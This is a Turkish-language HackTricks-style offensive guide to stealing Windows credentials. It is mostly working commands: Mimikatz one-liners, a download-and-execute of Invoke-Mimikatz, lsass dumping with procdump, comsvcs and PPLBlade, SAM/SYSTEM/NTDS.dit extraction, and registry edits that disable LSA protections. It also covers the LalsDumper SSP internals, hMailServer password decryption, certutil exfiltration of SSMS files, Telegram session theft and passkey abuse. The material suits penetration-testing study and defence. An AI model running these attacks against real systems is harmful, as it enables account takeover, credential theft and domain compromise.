# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz Kimlik Bilgileri
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'ın yapabildiği diğer işlemleri** [**bu sayfada**](credentials-mimikatz.md) **bulabilirsiniz.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Bazı olası kimlik bilgileri korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Credentials with Meterpreter

Kurbanın içinde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV'yi Atlama

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)** kaynağındaki **Procdump meşru bir Microsoft aracı olduğundan**, Defender tarafından algılanmaz.\
Bu aracı **lsass process'ini dump etmek**, **dump'ı indirmek** ve **credentials'ları** dump'tan **yerel olarak çıkarmak** için kullanabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** yazılımları, **lsass.exe'yi dump etmek için procdump.exe kullanımını** **kötü amaçlı** olarak **tespit edebilir**; bunun nedeni **"procdump.exe" ve "lsass.exe" dizelerini** **tespit etmeleridir**. Bu nedenle **procdump'a**, **lsass.exe adını** vermek **yerine**, **lsass.exe'nin PID'sini** bir **argüman** olarak **geçmek** daha **gizli** bir yöntemdir.

### **comsvcs.dll** ile lsass Dump Etme

`C:\Windows\System32` konumunda bulunan **comsvcs.dll** adlı bir DLL, çökme durumunda **process memory dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
İlk iki argümanın kullanılması önemli değildir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni, üçüncü bileşen ise kesinlikle **full** kelimesini oluşturur. Alternatif bir seçenek yoktur.\
Bu üç bileşen ayrıştırıldıktan sonra DLL, dump dosyasını oluşturur ve belirtilen process'in memory'sini bu dosyaya aktarır.\
**comsvcs.dll** kullanılarak lsass process'inin dump edilmesi mümkündür; böylece procdump'ı upload edip çalıştırma gereksinimi ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>

Aşağıdaki komut execution için kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi [**lssasy**](https://github.com/Hackndo) ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökümü alma**

1. Görev Çubuğu'na sağ tıklayın ve Task Manager'a tıklayın
2. More details seçeneğine tıklayın
3. Processes sekmesinde "Local Security Authority Process" işlemini arayın
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.

### procdump ile lsass dökümü alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft tarafından imzalanmış bir binary'dir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass Dumping

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dump'ını obfuscate etmeyi ve diske yazmadan uzak workstation'lara aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL protection'ı bypass etme
2. Defender signature-based detection mekanizmalarından kaçınmak için bellek dump dosyalarını obfuscate etme
3. Bellek dump'ını diske yazmadan (fileless dump) RAW ve SMB upload yöntemleriyle yükleme
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump olmadan SSP tabanlı LSASS dumping

Ink Dragon, `MiniDumpWriteDump` çağrısını hiç yapmayan ve bu nedenle EDR'ın bu API üzerindeki hook'larının hiçbir zaman tetiklenmediği, üç aşamalı bir dumper olan **LalsDumper**'ı kullanıma sunar:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir placeholder arar, bunu `rtu.txt` dosyasının mutlak yoluyla değiştirir, patched DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu, **LSASS**'ın kötü amaçlı DLL'i yeni bir Security Support Provider (SSP) olarak yüklemesini zorunlu kılar.
2. **LSASS içindeki Stage 2** – LSASS `nfdp.dll`'i yüklediğinde DLL, `rtu.txt` dosyasını okur, her byte'ı `0x20` ile XOR'lar ve kodu çözülmüş blob'u execution'ı devretmeden önce belleğe map eder.
3. **Stage 3 dumper** – Map edilen payload, hash'lenmiş API adlarından çözümlenen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adındaki özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış LSASS dump'ını dosyaya stream eder ve handle'ı kapatır; böylece exfiltration daha sonra gerçekleştirilebilir.

Operator notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Stage 1, hard-coded placeholder'ı `rtu.txt` dosyasının mutlak yoluyla yeniden yazar; bu nedenle bunları ayırmak chain'i bozar.
* Registration, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle gerçekleşir. LSASS'ın her boot sırasında SSP'yi yeniden yüklemesini sağlamak için bu değeri kendiniz ekleyebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dump'lardır. Bunların compression'ını yerel olarak açın, ardından credential extraction için Mimikatz/Volatility'ye aktarın.
* `lals.exe` çalıştırılırken admin/SeTcb yetkileri gerekir; böylece `AddSecurityPackageA` başarılı olur. Çağrı döndüğünde LSASS rogue SSP'yi transparently yükler ve Stage 2'yi execute eder.
* DLL'in diskten kaldırılması onu LSASS'tan evict etmez. Registry entry'yi silip LSASS'ı restart edin (reboot) veya long-term persistence için bırakın.

## CrackMapExec

### SAM hash'lerini dump et
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i Dump Etme
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump hedef DC'den NTDS.dit parola geçmişi
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM ve SYSTEM Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunur**. Ancak **korundukları** için bunları normal şekilde kopyalayamazsınız.

### Kayıt Defteri'nden

Bu dosyaları çalmanın en kolay yolu, Kayıt Defteri'nden bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**İndirin** those files to your Kali makinenize and **hash'leri çıkarın** using:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu service'i kullanarak korunan dosyaların kopyasını oluşturabilirsiniz. Administrator olmanız gerekir.

#### Using vssadmin

vssadmin binary'si yalnızca Windows Server sürümlerinde kullanılabilir
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM file nasıl kopyalanır** örneğidir (kullanılan sabit disk "C:" ve dosya C:\users\Public konumuna kaydedilir); ancak bunu korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) de kullanılabilir.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri barındıran **Active Directory**'nin kalbi olarak bilinir. Domain kullanıcılarına ait **password hash**'leri burada depolanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesneler hakkındaki ayrıntıları depolamakla görevlidir.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesneye ait **security descriptor**'lar burada tutulur; böylece depolanan nesnelerin güvenliği ve access control'ü sağlanır.

Christoffer Andersson'ın database-layer araştırması, bu tabloları ve version-specific davranışlarını daha ayrıntılı şekilde belgeler.<sup>[[8]](#references)</sup>

Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve dosya _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının **bir kısmı `lsass`** belleğinin içinde bulunabilir (performance iyileştirmesi için bir **cache** kullanıldığından, muhtemelen en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'lerin şifresini çözme

Hash üç kez şifrelenir:

1. **BOOTKEY** ve **RC4** kullanarak Password Encryption Key'in (**PEK**) şifresini çözün.
2. **PEK** ve **RC4** kullanarak **hash**'in şifresini çözün.
3. **DES** kullanarak **hash**'in şifresini çözün.

**PEK**, her domain controller'da **aynı değere** sahiptir; ancak ilgili domain controller'ın **SYSTEM** hive'ından alınan DC-specific **BOOTKEY** ile **NTDS.dit** içinde şifrelenmiştir. Bu nedenle credentials çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) hilesini kullanarak **ntds.dit** dosyasını da kopyalayabilirsiniz. Ayrıca **SYSTEM dosyasının** bir kopyasına da ihtiyacınız olacağını unutmayın (yine [**registry'den dump edin veya volume shadow copy**](#stealing-sam-and-system) hilesini kullanın).

### **NTDS.dit'ten hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, **hash'leri çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Bunları geçerli bir domain admin kullanıcısı kullanarak otomatik olarak da **çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**büyük NTDS.dit dosyaları** için bunları [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkarmak önerilir.

Son olarak, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` de kullanılabilir.

### **NTDS.dit dosyasından domain nesnelerini SQLite veritabanına çıkarma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Ham NTDS.dit dosyası zaten alındığında, yalnızca secret'lar değil, daha fazla bilgi çıkarmak için tüm nesneler ve bunların attribute'ları da çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır ancak sırların şifresinin çözülmesini sağlar (NT ve LM hash'leri, cleartext passwords gibi supplemental credentials, kerberos veya trust key'leri, NT ve LM password history'leri). Diğer bilgilerin yanı sıra aşağıdaki veriler çıkarılır: hash'leriyle birlikte user ve machine account'ları, UAC flag'leri, son logon ve password change zaman damgaları, account açıklamaları, isimleri, UPN, SPN, group'lar ve recursive membership'leri, organizational unit ağacı ve membership'i, trust türü, yönü ve attribute'larıyla birlikte trusted domain'ler...

## Lazagne

Binary'yi [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'yi çeşitli software'lerden credential çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'den kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Şuradan indirin: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve yalnızca **çalıştırın**; parolalar çıkarılacaktır.

## Boşta kalan RDP oturumlarını izleme ve güvenlik kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT’i, teknikleri her red-teamer için kullanışlı olan bir `DumpRDPHistory` tasker’ı içerir:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile taklit edebilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Gelen RDP kanıtı** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünü Event ID’leri **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) için sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin’in düzenli olarak bağlandığını öğrendikten sonra, **bağlantısı kesilmiş** oturumları hâlâ mevcutken LSASS’ı (LalsDumper/Mimikatz ile) dump edin. CredSSP + NTLM fallback, doğrulayıcı bilgilerini ve token’larını LSASS’ta bırakır; bunlar daha sonra SMB/WinRM üzerinden yeniden oynatılarak `NTDS.dit` alınabilir veya domain controller’larda persistence oluşturulabilir.

### FinalDraft tarafından hedeflenen Registry downgrade’leri

Aynı implant, credential theft işlemini kolaylaştırmak için çeşitli Registry anahtarlarını da değiştirir:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarının etkinleştirilmesi, RDP sırasında tam kimlik bilgisi/bilet yeniden kullanımını zorunlu kılar ve pass-the-hash tarzı pivot işlemlerini etkinleştirir.
* `LocalAccountTokenFilterPolicy=1`, UAC token filtrelemesini devre dışı bırakarak yerel yöneticilerin ağ üzerinden kısıtlanmamış tokenlar almasını sağlar.
* `DSRMAdminLogonBehavior=2`, DSRM yöneticisinin DC çevrimiçiyken oturum açmasına izin vererek saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sağlar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırarak LalsDumper gibi dumper araçlarının belleğe erişimini kolaylaştırır.

## hMailServer veritabanı kimlik bilgileri (compromise sonrası)

hMailServer, veritabanı parolasını `[Database] Password=` altında `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` dosyasında saklar. Değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4 baytlık word endianness değişimleri kullanılarak Blowfish ile şifrelenir. INI dosyasındaki hex string'i şu Python snippet'iyle kullanın:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Açık metin parolayla SQL CE veritabanını dosya kilitlerinden kaçınmak için kopyalayın, 32-bit provider'ı yükleyin ve hash'leri sorgulamadan önce gerekirse yükseltin:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` sütunu hMailServer hash formatını kullanır (hashcat modu `1421`). Bu değerleri kırmak, WinRM/SSH pivotları için yeniden kullanılabilir kimlik bilgileri sağlayabilir.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı araçlar, LSA logon callback'i `LsaApLogonUserEx2` öğesini intercept ederek **plaintext logon passwords** yakalar. Amaç, kimlik bilgilerini **logon sırasında** (hashing işleminden önce) yakalamak ve ardından diske yazmak veya operatöre döndürmek için authentication package callback'i hook'lamak ya da sarmalamaktır. Bu genellikle LSA'ya inject olan veya LSA ile register olan ve başarılı her interactive/network logon olayını kullanıcı adı, domain ve password bilgileriyle kaydeden bir helper olarak uygulanır.<sup>[[1]](#references)</sup>

Operational notes:
- Helper'ı authentication path'e yüklemek için local admin/SYSTEM gerektirir.
- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kayıtlı bağlantı bilgilerini kullanıcı başına oluşturulan bir `sqlstudio.bin` dosyasında saklar. Özel dumper'lar dosyayı parse ederek kayıtlı SQL credentials bilgilerini kurtarabilir. Yalnızca command output döndüren shell'lerde dosya, genellikle Base64 olarak encode edilip stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Operatör tarafında dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Telegram Desktop `tdata` oturum hırsızlığı

Telegram Desktop, yetkilendirme ve hesap durumunu **`tdata`** dizininde tutar. Kopyalanmış bir session, yetkilendirme geçerli kaldığı sürece hesap parolası olmadan authenticate olmak için uyumlu tooling ile yüklenebilir; yerel veri encryption etkinse stealer'ın ayrıca passcode'a da ihtiyacı vardır. Authenticated bir session daha sonra identity verilerini, dialog ve membership metadata'sını, mesajları ve indirilebilir medyayı açığa çıkarabilir.<sup>[[10]](#references)</sup>

### Keşif ve edinme

Hem kurulu hem de portable yerleşimleri arayın; Microsoft Store package adları değişiklik gösterebilir, bu nedenle `TelegramMessenge` içeren package dizinlerini enumerate edin ve bunların `LocalCache\Roaming` subtree'sini inceleyin.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
Normal okumalar başarısız olursa ve süreç token'ı **zaten SeBackupPrivilege içeriyor ve etkinleştirilmiş durumdaysa**, backup-aware access bir geri dönüş yöntemi sağlar; ayrıcalığı edinmez veya süreci yükseltmez. `FILE_FLAG_BACKUP_SEMANTICS` ile birlikte `CreateFileW`, backup/restore semantiği talep edebilir ve gerekli token ayrıcalıkları mevcut olduğunda dosya güvenlik denetimlerini geçersiz kılabilir; ancak tek başına bu flag, uyumsuz bir sharing lock'u aşamaz.<sup>[[10]](#references)[[11]](#references)</sup>

Canlı olarak kilitlenmiş dosyalar için bir **Volume Shadow Copy** oluşturun; ACL tarafından engellenen dosyalar için `robocopy /B`, backup mode kullanır ve dosya ile dizin ACL'lerini geçersiz kılar.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
Bant genişliğini gözeten bir implant önce yalnızca dosya yolu envanterini gönderebilir, C2 tarafından zaten saklanan yollarla birlikte bir snapshot tanımlayıcısı alabilir ve yalnızca eksik dosyaları yükleyebilir. Bu nedenle, özyinelemeli `tdata` numaralandırmasının ardından gerçekleştirilen küçük artımlı aktarımlar bile başarılı bir oturum hırsızlığına işaret edebilir.<sup>[[10]](#references)</sup>

### Tespit ve containment

Bir Telegram dışı işlemin `tdata` dizinine özyinelemeli erişimini `SeBackupPrivilege` etkinleştirmesi, backup-semantics dosya açma işlemleri, VSS etkinliği veya `/B` kullanan bir alt `robocopy.exe` işlemiyle ilişkilendirin. Ayrıca hem `%APPDATA%` hem de `%LOCALAPPDATA%\Packages` dizinlerinin hızlıca numaralandırılmasını ve ardından aynı işlemden giden bağlantıları araştırın. Ele geçirilmenin ardından, tanınmayan oturumları sonlandırmak için **Settings → Devices** (veya **Privacy & Security → Active Sessions**) bölümünü kullanın; yalnızca two-step verification özelliğini etkinleştirmek, daha önce çalınmış bir yetkilendirmeyi iptal etmez.<sup>[[10]](#references)[[13]](#references)</sup>

## Chrome on Windows üzerinden Passkeys / WebAuthn kimlik bilgisi hırsızlığı

**Chrome + Google Password Manager synced passkeys** kullanan bir Windows ana bilgisayarında **mağdur kullanıcı** olarak code execution elde edilirse, **admin/SYSTEM olmadan bile** passkeys ilgi çekici bir post-exploitation hedefi hâline gelir.<sup>[[4]](#references)</sup>

### İlgi çekici yerel artefaktlar
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`**, protobuf-encoded **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir process, senkronize passkey'ler için **RP ID**, **username**, **credential ID** ve şifrelenmiş private-key materyalini listeleyebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve senkronize kimlik bilgilerini kurtarmak için kullanılan wrapped secret gibi yerel cihaz enrollment durumunu depolar.<sup>[[4]](#references)</sup>

Hızlı triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM'e bağlı key blob'ları yine de yerel bir signing oracle olarak kötüye kullanılabilir

Tarayıcı, TPM destekli bir identity key'i **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği durumda depolarsa, malware'in ham private key'i çıkarması gerekmez. Malware, blob'u **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın kontrol ettiği verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Bu, **hardware binding'in cihaz dışına aktarımı önlediği, ancak ele geçirilmiş uç noktada aynı kullanıcı tarafından kullanımı önlemediği** anlamına gelir.

### Pratik kötüye kullanım yolları

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` öğelerini listeleyin.
- Bir passkey login başlatın ve yeni bir WebAuthn challenge alın.
- Çalınan `wrapped_identity_private_key` blob'unu kurban TPM'i üzerinde kullanarak cloud-authenticator request binding'i imzalayın.
- Döndürülen assertion'ı relying party'ye relay edin.
- Bu, RP `userVerification=preferred` değerini kabul ettiğinde veya **`UV=0`** içeren assertion'ları reddetmediğinde özellikle değerlidir.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` öğesini silerek veya geçerli imzalı bir `device/forget` operation göndererek yeniden onboarding'i zorlayın.
